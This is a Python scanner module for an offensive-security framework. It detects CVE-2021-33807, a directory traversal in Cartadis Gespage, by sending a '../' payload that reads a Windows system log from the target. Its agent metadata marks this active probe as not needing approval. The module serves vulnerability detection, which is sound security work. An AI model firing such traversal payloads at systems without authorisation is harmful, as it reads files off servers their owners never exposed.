#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cartadis Gespage through 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cartadis Gespage 8.2.1 - Directory Traversal Detection',
        'description': 'Cartadis Gespage through 8.2.1 allows Directory Traversal in gespage/doDownloadData and gespage/webapp/doDownloadData.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lfi', 'gespage', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.on-x.com/sites/default/files/on-x_-_security_advisory_-_gespage_-_cve-2021-33807.pdf',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33807',
            'https://www.gespage.com/cartadis-db/',
            'https://www.cartadis.com/gespage-website/',
            'https://support.gespage.com/fr/support/solutions/articles/14000130201-security-advisory-gespage-directory-traversal',
        ],
        'cve': 'CVE-2021-33807',
    }

    def run(self):
        r = self.http_request(method="GET", path='/gespage/doDownloadData?file_name=../../../../../Windows/debug/NetSetup.log', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('NetpDoDomainJoin:',)
        header_any = ('application/octet-stream',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Cartadis Gespage 8.2.1 - Directory Traversal detected",
                path='/gespage/doDownloadData?file_name=../../../../../Windows/debug/NetSetup.log',
            )
            return True
        return False

